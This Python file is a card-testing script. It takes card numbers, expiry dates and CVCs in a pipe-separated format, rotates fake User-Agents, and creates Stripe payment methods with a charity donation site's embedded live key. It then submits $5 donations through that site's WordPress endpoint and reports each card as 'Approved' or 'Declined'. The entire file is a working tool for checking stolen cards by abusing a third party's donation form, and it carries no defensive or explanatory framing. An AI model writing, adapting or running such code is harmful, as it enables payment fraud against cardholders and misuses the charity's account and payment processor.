import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
from datetime import datetime

class StripeProcessor:
    def __init__(self):
        self.ua = UserAgent()

    def process_card_at(self, ccx, billing_info=None):
        ccx = ccx.strip()
        try:
            n, mm, yy, cvc = ccx.split("|")
        except ValueError:
            return {"status": "Declined", "response": "Invalid card format", "gateway": "Authnet [5$]"}

        if "20" in yy:
            yy = yy.split("20")[1]

        user_agent = self.ua.random

        return self._process_needhelped(n, mm, yy, cvc, user_agent, billing_info)

    def fetch_nonce_and_cookie(self, user_agent):
        url = 'https://needhelped.com/campaigns/poor-children-donation-4/donate/'
        headers = {'User-Agent': user_agent}

        session = requests.Session()
        response = session.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        nonce_input = soup.find('input', {'name': '_charitable_donation_nonce'})
        if not nonce_input:
            return None, None

        nonce = nonce_input.get('value')
        cookies = session.cookies.get_dict()
        return nonce, cookies

    def _process_needhelped(self, n, mm, yy, cvc, user_agent, billing_info):
        try:
            # Default billing info if not provided
            if not billing_info:
                billing_info = {
                    'name': 'John Doe',
                    'email': 'user@example.com',
                    'first_name': 'John',
                    'last_name': 'Doe',
                    'address': '123 Main St',
                    'city': 'New York',
                    'state': 'NY',
                    'postcode': '10001',
                    'country': 'US',
                    'phone': '5551234567',
                    'amount': '5.00'
                }

            # Create payment method
            payment_data = {
                'type': 'card',
                'card[number]': n,
                'card[cvc]': cvc,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'billing_details[name]': billing_info.get('name'),
                'billing_details[email]': billing_info.get('email'),
                'billing_details[address][city]': billing_info.get('city'),
                'billing_details[address][country]': billing_info.get('country'),
                'billing_details[address][line1]': billing_info.get('address'),
                'billing_details[address][line2]': billing_info.get('address_2', ''),
                'billing_details[address][postal_code]': billing_info.get('postcode'),
                'billing_details[address][state]': billing_info.get('state'),
                'billing_details[phone]': billing_info.get('phone'),
                'payment_user_agent': 'stripe.js/2b425ea933; stripe-js-v3/2b425ea933',
                'referrer': 'https://needhelped.com',
                'key': 'pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr',
            }

            pm_response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                data=payment_data,
                headers={'User-Agent': user_agent},
                timeout=10
            )
            pm_json = pm_response.json()
            
            # Check for payment method errors
            if 'error' in pm_json:
                error = pm_json['error']
                code = error.get('code', '')
                message = error.get('message', '').lower()
                
                if 'incorrect_cvc' in code or 'security code incorrect' in message:
                    return {"status": "Declined", "response": "error: CVV_INCORRECT", "gateway": "Authnet [5$]"}
                elif 'invalid_cvc' in code or 'card must contain cvc' in message:
                    return {"status": "Declined", "response": "error: CVV_MISSING", "gateway": "Authnet [5$]"}
                elif 'expired' in message or 'invalid_expiry' in code:
                    return {"status": "Declined", "response": "The provided card is expired", "gateway": "Authnet [5$]"}
                elif 'test_mode' in message or 'live mode' in message:
                    return {"status": "Declined", "response": "Invalid_Card_Data", "gateway": "Authnet [5$]"}
                elif 'declined' in message:
                    return {"status": "Declined", "response": "This transaction has been Declined", "gateway": "Authnet [5$]"}
                else:
                    return {"status": "Declined", "response": message, "gateway": "Authnet [5$]"}

            payment_method_id = pm_json['id']

            # Get donation nonce
            nonce, cookies = self.fetch_nonce_and_cookie(user_agent)
            if not nonce:
                return {"status": "Declined", "response": "Failed to process payment", "gateway": "Authnet [5$]"}

            # Process donation
            donation_data = {
                'charitable_form_id': '682b05da7e210',
                '682b05da7e210': '',
                '_charitable_donation_nonce': nonce,
                '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
                'campaign_id': '1164',
                'description': 'Poor Children Donation Support',
                'ID': '455173',
                'donation_amount': 'custom',
                'custom_donation_amount': billing_info.get('amount', '5.00'),
                'first_name': billing_info.get('first_name'),
                'last_name': billing_info.get('last_name'),
                'email': billing_info.get('email'),
                'address': billing_info.get('address'),
                'address_2': billing_info.get('address_2', ''),
                'city': billing_info.get('city'),
                'state': billing_info.get('state'),
                'postcode': billing_info.get('postcode'),
                'country': billing_info.get('country'),
                'phone': billing_info.get('phone'),
                'gateway': 'stripe',
                'stripe_payment_method': payment_method_id,
                'action': 'make_donation',
                'form_action': 'make_donation',
            }

            headers = {
                'User-Agent': user_agent,
                'Referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
                'X-Requested-With': 'XMLHttpRequest',
            }

            donation_response = requests.post(
                'https://needhelped.com/wp-admin/admin-ajax.php',
                cookies=cookies,
                headers=headers,
                data=donation_data,
                timeout=10
            )
            resp_json = donation_response.json()
            
            # Process response
            if isinstance(resp_json, dict):
                if 'requires_action' in resp_json and resp_json['requires_action']:
                    return {"status": "Declined", "response": "A Duplicate transaction has been found", "gateway": "Authnet [5$]"}
                elif 'success' in resp_json and resp_json['success']:
                    return {"status": "Approved", "response": "Order Confirmed", "gateway": "Authnet [5$]"}
                elif 'errors' in resp_json and 'Your card was declined' in str(resp_json['errors']):
                    return {"status": "Declined", "response": "This transaction has been Declined", "gateway": "Authnet [5$]"}
                else:
                    return {"status": "Declined", "response": "Payment processing failed", "gateway": "Authnet [5$]"}
            else:
                return {"status": "Declined", "response": "Unexpected response from server", "gateway": "Authnet [5$]"}

        except Exception as e:
            return {"status": "Declined", "response": f"Processing Failed: {str(e)}", "gateway": "Authnet [5$]"}
